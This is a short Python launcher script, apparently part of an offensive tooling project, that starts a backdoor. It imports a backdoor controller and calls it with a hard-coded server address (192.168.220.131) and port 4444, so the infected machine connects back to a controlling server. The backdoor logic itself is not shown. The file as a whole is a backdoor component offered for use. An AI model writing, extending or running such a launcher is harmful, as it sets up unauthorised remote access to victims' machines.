# src/backdoors/start_backdoor.py

from controllers.backdoors.backdoor_controller import start_backdoor

if __name__ == "__main__":
    server_ip = '192.168.220.131'
    server_port = 4444
    try:
        start_backdoor(server_ip, server_port)
    except KeyboardInterrupt:
        print("Backdoor stopped.")
